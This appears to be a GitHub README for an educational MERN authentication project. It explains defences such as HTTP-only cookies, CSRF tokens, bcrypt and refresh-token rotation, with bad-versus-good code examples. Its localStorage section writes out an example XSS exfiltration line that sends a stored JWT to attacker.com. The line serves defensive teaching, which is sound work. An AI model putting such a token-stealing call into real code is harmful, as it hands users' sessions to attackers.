# AuthStack — Deep Dive into Secure Web Authentication

> *"Auth güvenliğini anlamak için yapılmış proje."*

![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=for-the-badge&logo=mongodb&logoColor=white)
![Express](https://img.shields.io/badge/Express-000000?style=for-the-badge&logo=express&logoColor=white)
![React](https://img.shields.io/badge/React-20232A?style=for-the-badge&logo=react&logoColor=61DAFB)
![Node.js](https://img.shields.io/badge/Node.js-339933?style=for-the-badge&logo=node.js&logoColor=white)
![JWT](https://img.shields.io/badge/JWT-000000?style=for-the-badge&logo=jsonwebtokens&logoColor=white)

![Status](https://img.shields.io/badge/Status-In%20Development-yellow?style=for-the-badge)

An educational deep-dive into secure web authentication. Every security decision in this project comes with a **WHY** — not just "use HTTP-only cookies" but "here's what an attacker does if you don't." Built to understand auth security from first principles, not just copy patterns.

---

## Security Concepts Covered

| Threat | Attack Vector | Our Defense |
|---|---|---|
| Token theft via XSS | Malicious JS reads `localStorage` | HTTP-only cookies (JS can't touch them) |
| CSRF (cross-site forgery) | Attacker tricks browser into sending requests | CSRF tokens + SameSite cookie flag |
| Brute-force login | Automated password guessing | Rate limiting + account lockout |
| Rainbow table attacks | Precomputed password hash lookup | bcrypt with per-user random salt |
| Stolen refresh token reuse | Attacker replays captured token | Refresh token rotation (single-use) |
| Long-lived session risk | Old token still valid after compromise | Short JWT expiry (15 min access token) |
| Replay attacks | Reuse of a logged-out token | Token blacklist in Redis |

---

## Why Not localStorage?

```
localStorage approach (INSECURE):

  Any JavaScript on the page can read localStorage.
  If one of your npm packages is compromised (supply chain attack),
  or if there is a single XSS vulnerability anywhere,
  an attacker can do:

      fetch("https://attacker.com/steal?token=" + localStorage.getItem("jwt"))

  And your user's session is gone.

HTTP-only cookie approach (SAFE):

  document.cookie → only returns non-HttpOnly cookies
  The browser sends HTTP-only cookies automatically on requests,
  but NO JavaScript — including your own — can read them.
```

---

## Auth Flow with Security Annotations

```
Client                          Server                        Storage
  │                               │                              │
  │── POST /register ────────────►│                              │
  │   { email, password }         │─ bcrypt.hash(pw, 12) ──────►│ MongoDB
  │                               │  (12 rounds: ~250ms/hash,    │ User saved
  │◄── 201 Created ───────────────│   makes brute-force slow)    │
  │                               │                              │
  │── POST /login ───────────────►│                              │
  │   { email, password }         │─ bcrypt.compare() ──────────►│
  │                               │  Rate limit: 5 tries/15min   │
  │                               │─ Issue access JWT (15min) ───►│ (memory only)
  │◄── accessToken (body) ────────│─ Set refresh cookie ─────────►│ HTTP-only cookie
  │    refreshToken (HTTP-only)   │  (7 days, Secure, SameSite)   │
  │                               │                              │
  │── GET /protected ────────────►│                              │
  │   Authorization: Bearer ...   │─ verify(token, secret)       │
  │                               │  If expired → 401            │
  │◄── 200 data ──────────────────│                              │
  │                               │                              │
  │── POST /refresh ─────────────►│  (cookie sent automatically) │
  │   (no body needed)            │─ Validate refresh token       │
  │                               │─ Blacklist old token ────────►│ Redis
  │◄── new accessToken ───────────│─ Issue new refresh cookie     │
  │                               │                              │
  │── POST /logout ──────────────►│                              │
  │                               │─ Add refresh to blacklist ───►│ Redis
  │◄── 200 Logged out ────────────│─ Clear cookie                 │
```

---

## Common Auth Mistakes (And How We Avoid Them)

### ❌ Mistake 1: Storing JWT in localStorage
```js
// BAD — readable by any JS (XSS vulnerability)
localStorage.setItem("token", jwtToken);

// GOOD — set by server as HTTP-only cookie
res.cookie("refreshToken", token, { httpOnly: true, secure: true, sameSite: "strict" });
```

### ❌ Mistake 2: Never rotating refresh tokens
```js
// BAD — same refresh token works forever until expiry
// If stolen, attacker has access for 7 days with no way to stop it

// GOOD — single-use refresh tokens
// On each /refresh call: invalidate old token, issue new one
// Stolen token becomes useless after legitimate user refreshes
```

### ❌ Mistake 3: Synchronous bcrypt in route handler
```js
// BAD — blocks the event loop during password hash
const hash = bcrypt.hashSync(password, 12);

// GOOD — async
const hash = await bcrypt.hash(password, 12);
```

### ❌ Mistake 4: Exposing which field failed on login
```js
// BAD — tells attacker which emails exist in your database
if (!user) return res.json({ error: "Email not found" });

// GOOD — generic error always
return res.status(401).json({ error: "Invalid credentials" });
```

---

## Implementation

### JWT Configuration
```js
// Access token: short-lived, sent in response body
const accessToken = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: "15m" });

// Refresh token: long-lived, HTTP-only cookie
const refreshToken = jwt.sign({ userId: user._id }, process.env.REFRESH_SECRET, { expiresIn: "7d" });
res.cookie("refreshToken", refreshToken, {
  httpOnly: true,   // no JS access
  secure: true,     // HTTPS only
  sameSite: "strict", // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```

### CSRF Protection
```js
const csrf = require("csurf");
app.use(csrf({ cookie: { httpOnly: true } }));
// Each form request needs the CSRF token from: req.csrfToken()
```

---

## Project Structure

```
mern_authentication/
├── backend/
│   ├── controllers/authController.js
│   ├── middleware/
│   │   ├── authMiddleware.js   # verify JWT, attach user to req
│   │   └── rateLimiter.js      # 5 login attempts per 15 min
│   ├── models/User.js          # bcrypt pre-save hook
│   └── routes/auth.js
└── frontend/
    └── src/
        ├── pages/Login.jsx
        ├── pages/Register.jsx
        └── context/AuthContext.jsx   # stores accessToken in memory
```

---

## Roadmap

- [ ] **Phase 1** — Core auth: register, login, logout with bcrypt + JWT
- [ ] **Phase 2** — HTTP-only cookie refresh tokens + rotation
- [ ] **Phase 3** — CSRF protection + rate limiting + Redis blacklist
- [ ] **Phase 4** — Email verification + password reset flow
- [ ] **Phase 5** — Security audit: pen test with OWASP ZAP, write findings report
